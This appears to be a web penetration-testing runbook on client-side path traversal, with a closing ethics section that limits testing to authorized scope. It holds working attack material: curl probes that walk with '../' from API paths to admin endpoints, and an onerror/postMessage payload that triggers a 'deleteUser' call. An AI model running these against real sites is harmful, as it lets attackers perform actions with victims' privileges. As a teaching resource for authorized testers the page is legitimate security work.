---
title: "Client-Side Path Traversal"
description: "Abusing path segments that client-side JavaScript interpolates into API URLs, walking out with ../ to reach unintended endpoints, often chained with CSRF."
phase: Web
order: 19
tags:
  - cspath
  - csrf
  - client-side
  - api
tools:
  - curl
  - burp suite
updated: 2026-10-01
---

A runbook for authorized CSPath testing on **in-scope** targets. Goal: find a path value that JavaScript interpolates into an API URL, walk out with `../` to hit an unintended endpoint, and prove impact on your own account.

## 1. Spot the URL-building pattern

```bash
# Fetch the JS bundles and look for concatenated API paths
curl -s https://target/ | grep -oE '/static/js/[^"]+\.js' | sort -u > bundles.txt
while read -r b; do curl -s "https://target$b"; done < bundles.txt \
  > all.js
grep -nE "fetch\(|axios\.|/api/.*\+|\\\$\{" all.js | head -50
```

The controlled value may come from the URL path, query string, hash, or `postMessage`. If it is not validated, you can steer the request.

## 2. Trace the controlled value

Confirm the source feeds the URL, then test in DevTools which final request the browser sends. Example pattern:

```js
fetch('/api/v1/' + userId + '/documents');
fetch(`/api/posts/${postId}/comments`);
```

## 3. Confirm traversal

Replace the segment with encoded traversal sequences and watch the request.

```bash
# Direct API probe with traversal (server-side normalization check)
curl -s --path-as-is "https://target/api/v1/../../admin/users" -H "Cookie: session=..."
curl -s --path-as-is "https://target/api/v1/%2e%2e%2f%2e%2e%2fadmin%2fusers" -H "Cookie: session=..."
```

Some clients/servers normalize once, so double-encode and test mixed slashes (`..\\`, `....//`). Verify the final request in DevTools, not just the CLI.

## 4. Reach unintended endpoints

Traversal often turns a read-only lookup into a powerful call:

- Delete/update endpoints reached by walking out of a GET path.
- Switch resource types: `/api/v1/$input/detail` -> `/api/v1/admin/reset`.
- Versioned or internal APIs the frontend never intended to expose.

The request carries the victim's cookies, so it runs with their privileges.

## 5. Chain with CSRF and postMessage

```html
<img src=x onerror="postMessage('../../admin/deleteUser?id=1','*')">
```

If the path value arrives via `postMessage`, any allowed origin can drive it; a malicious iframe can set the hash or call the handler that builds the URL.

## 6. Prove impact

The strongest proof is a state-changing action performed on your own account through your own browser. Show the exact constructed URL and the resulting server action.

## Full pipeline

```bash
# 1. Collect JS bundles and grep for interpolated API paths
curl -s https://target/ | grep -oE '/static/js/[^"]+\.js' | sort -u > bundles.txt
while read -r b; do curl -s "https://target$b"; done < bundles.txt > all.js
grep -nE "fetch\(|axios\.|/api/.*\+|\\\$\{" all.js | head -50

# 2. Probe traversal directly (no client normalization)
curl -s --path-as-is "https://target/api/v1/../../admin/users" -H "Cookie: session=..."
curl -s --path-as-is "https://target/api/v1/%2e%2e%2f%2e%2e%2fadmin%2fusers" -H "Cookie: session=..."

# 3. Confirm in DevTools which final request the browser emits, then chain via postMessage/CSRF
```

## Ethics & legality

- Only test targets within an authorized scope and only with accounts you own.
- Never trigger destructive traversal endpoints (delete/reset) against real users.
- Document the constructed URL, the final request, and the resulting action as evidence.
